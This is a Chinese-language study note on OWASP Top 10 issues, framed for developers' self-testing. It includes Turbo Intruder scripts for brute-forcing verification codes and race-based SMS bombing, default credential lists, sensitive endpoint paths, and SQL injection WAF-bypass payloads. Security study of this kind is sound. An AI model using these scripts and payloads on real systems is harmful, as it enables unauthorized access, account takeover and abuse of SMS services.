# OWASP-Top10

!!! warning "警告"
        主要学来给开发用，注意千万别做任何可能存在违法的行为！！！
        道路千万条！！！安全第一条！！！

## 爆破

这是一个很容易犯的错误，一般都需要多次错误锁定之类的操作，或者短时间内只允许一定次数的操作，别让测试人员把server搞down了！！！

下面是开发人员请采纳的自查爆破方式（如有需求，稍微进行修改）

工具采用BurpSuite —— Turbo Intruder

### Py验证码6位

```python
from itertools import product  
  
def brute_veify_code(target, engine, length):  
    pattern = '1234567890'  
    for i in list(product(pattern, repeat=length)):  
        code =  ''.join(i)  
        engine.queue(target.req, code)  
  
def queueRequests(target, wordlists):  
    engine = RequestEngine(endpoint=target.endpoint,  
        concurrentConnections=30,  
        requestsPerConnection=100,  
        pipeline=True  
    )  
brute_veify_code(target, engine, 6)  
  
def handleResponse(req, interesting):  
    # currently available attributes are req.status, req.wordcount, req.length and req.response  
    if 'error' not in req.response:  
        table.add(req)
```

### 通用弱口令

请自行搜索，Top10或者Top100系统账户、管理员初始常用密码！！！开发能不能random困难密码啊～（16位各种特殊字符英文数字那种！）

- **admin/admin123**
- admin/123456
- admin/admin
- admin/
- admin/admin123456
- system/123456
- \*/1

例外，别再使用各种软件、数据库新建时给的默认密码，开发上线时请一定改掉

##### RabbitMQ

guest/guest

### 短信轰炸 race

**请求包：x-req:%s**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=60,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(60):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

## 注入

### 老破小

!!! note "注意"
  开发人员如果接收到这类项目一定注意Sql！！！

一些很老、很破又是小站。或者长期不维护的系统。特征是页面较为简陋，排列不齐

可能存在User-agent等盲注方式

***

## 越权

### 工具

开发完了之后，可以试着用一些BurpSuite的工具进行自测，算是还不错的方法

- BurpSuite —— HAE ！！！

下面列出一些做开发时常常忽略的地址和泄漏方式等，请开发人员注意！！！

### 备份文件路径

**固定**
/WEB.rar zip
/log.rar zip

**非固定：**
/dist.zip rar
/ecology.rar
源代码备份等

### robots.txt信息泄漏

记录协议（爬虫协议、规则等）

/robots.txt 

### phpinfo信息泄漏

记录php配置情况

/phpinfo 

### Swagger2

记录接口相关信息

/v2/api-docs
/v2/\_catalog


### pprof未授权访问

debug/pprof/goroutine?debug=1

### grafana

/dashboard/snapshot/:key

/api/snapshots/:key

### 返回包敏感信息

!!! note "注意"
    返回包中别放敏感信息！！！

### 信息填写敏感信息

!!! note "注意"
    信息填写有时候会对应uid，uid的返回包中存在敏感信息（千万别剩下功夫，一定先验证过了再返回数据，同时，谁的账号就返回谁的数据）

###  Session共用技巧

- 同一个地址加上http和不加https可能是两个站（看转发与否），注意开发时不要存在Session共用情况

### 信息修改

- 一般来说存在id类的地方，都可能犯这个错误

### 绕过

- 返回包中时常存在判断正确错误的参数，这个可能是一个需要注意的点，不要让这个校验能通过前端修改等方式被绕过了

### 绑定

!!! note "注意"
    存在绑定等操作的时候，一定要谨慎再谨慎，千万不可以存在随机修改一个号码就过了（尤其是，只验证号码，不验证号码和验证码是否一致的时候）

### 接口利用

!!! note "注意"
    有一些接口，千万别给调用权限，尤其是短信收发！！！

### 文件下载

- 如果写代码时，下载方式是如下所示，请一定鉴权

```
?filepath=\*
```

***

## 命令执行
### Redis未授权访问

- 想知道原因和怎么预防，请百度

### Struts2

- 想知道原因和怎么预防，请百度

## 文件上传
### 千万黑白名单搞起来(同时千万防止绕过，最好的是自行解析)

## SSRF

以一个进行举例，请根据这个关键词进行搜索，学习并预防相关漏洞

### cve-2019-18394-ssrf

## WAF绕过技巧

### 应用层 

##### 大小写/关键字替换 

- id=1 UnIoN/**/SeLeCT 1,user() 
- Hex() bin() 等价于ascii() 
- Sleep() 等价于 benchmark() 
- Mid()substring() 等价于 substr() 
- @@user 等价于 User() 
- @@Version 等价于 version() 

##### 各种编码 

- 大小写，URL，hex，%0A等 

##### 注释使用 

- // -- --+ # /**/ + :%00 /!**/等 

##### 再次循环 

- union==uunionnion 

##### 等价替换 

- user()=@@user() and=& or=| ascii=hex等 

##### 参数污染 

- ?id=1&id=2&id=3 

##### 编码解码及加密解密 

- s->%73->%25%37%33 
- hex,unlcode,base64等 

##### 更改请求提交方式 

- GET POST COOKIE等 
- POST->multipart/form-data 
- 中间件HPP参数污染 

##### 数据库特性 

- Mysql技巧 

  - mysql注释符有三种：
  
    #、/*...*/、-- ... (注意--后面有一个空格) 

  - 空格符

    [0x09,0x0a-0x0d,0x20,0xa0]

  - 特殊符号

    %a 换行符：可结合注释符使用%23%0a，%2d%2d%0a。 

  - 内联注释
  
    /*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540

  - mysql黑魔法
    
    select{x username}from {x11 test.admin};

- SQL Server技巧 
  - 用来注释掉注射后查询的其余部分： 
   
    /* 		C语言风格注释 
   
    -- 		SQL注释 
   
    ; 00％ 	空字节 

  - 空白符

    [0x01-0x20] 

  - 特殊符号

    %3a 冒号 

    id=1 union:select 1,2 from:admin 

  - 函数变形

    如db_name[空白字符]() 

- Oracle技巧 

  - 注释符

    --、/**/ 

  - 空白字符

    [0x00,0x09，0x0a-0x0d,0x20] 

- 配合FUZZ 

select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin 

### 逻辑层 

##### 逻辑问题 

- 云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。 
- 当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。 
- HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。 
- 特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1%00and 1=2 union select 1,2,column_name from information_schema.columns 

##### 性能问题 

- 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 
- 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 
- 例子1：

  ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 
  PS：0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 

- 例子2： 

  ?a0=0&a1=1&.....&a100=100&id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata 

备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。 

##### 白名单 

- 方式一：IP白名单 

从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 

测试方法：修改http的header来bypass waf 

X-forwarded-for 

X-remote-IP 

X-originating-IP 

x-remote-addr 

X-Real-ip 

- 方式二：静态资源 

特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。 

    - http://10.9.9.201/sql.php?id=1

    - http://10.9.9.201/sql.php/1.js?id=1

备注：Aspx/php只识别到前面的.aspx/.php 后面基本不识别 

- 方式三：url白名单 

为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势： 

## 判断经验总结

- [XXE绕过](https://www.cnblogs.com/20175211lyz/p/11413335.html)
- [PostgreSQL注入](https://blog.csdn.net/hack8/article/details/6427911)
- [MSSQL注入](https://www.cnblogs.com/xishaonian/p/6173644.html)
- [报错盲注](https://www.jianshu.com/p/bc35f8dd4f7c)
